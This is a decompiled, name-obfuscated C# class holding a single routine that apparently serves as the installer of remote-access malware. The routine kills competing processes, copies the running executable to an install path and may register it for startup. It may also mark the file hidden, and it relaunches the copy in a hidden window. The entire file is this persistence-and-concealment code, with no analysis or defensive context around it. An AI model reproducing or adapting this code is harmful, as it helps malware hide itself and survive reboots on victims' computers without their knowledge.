using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

public static class GClass35
{
	public static void smethod_0(GClass33 client)
	{
		bool flag = false;
		if (!Directory.Exists(Path.Combine(GClass0.string_4, GClass0.string_5)))
		{
			try
			{
				Directory.CreateDirectory(Path.Combine(GClass0.string_4, GClass0.string_5));
			}
			catch (Exception)
			{
				return;
			}
		}
		if (File.Exists(GClass53.InstallPath))
		{
			try
			{
				File.Delete(GClass53.InstallPath);
			}
			catch (Exception ex2)
			{
				if (ex2 is IOException || ex2 is UnauthorizedAccessException)
				{
					Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(GClass53.InstallPath));
					int id = Process.GetCurrentProcess().Id;
					Process[] array = processesByName;
					foreach (Process process in array)
					{
						if (process.Id != id)
						{
							process.Kill();
							flag = true;
						}
					}
				}
			}
		}
		if (flag)
		{
			Thread.Sleep(5000);
		}
		try
		{
			File.Copy(GClass53.CurrentPath, GClass53.InstallPath, overwrite: true);
		}
		catch (Exception)
		{
			return;
		}
		if (GClass0.bool_1 && !GClass38.smethod_0())
		{
			GClass53.AddToStartupFailed = true;
		}
		if (GClass0.bool_2)
		{
			try
			{
				File.SetAttributes(GClass53.InstallPath, FileAttributes.Hidden);
			}
			catch (Exception)
			{
			}
		}
		GClass42.smethod_3(GClass53.InstallPath);
		ProcessStartInfo startInfo = new ProcessStartInfo
		{
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			UseShellExecute = false,
			FileName = GClass53.InstallPath
		};
		try
		{
			Process.Start(startInfo);
		}
		catch (Exception)
		{
		}
	}
}
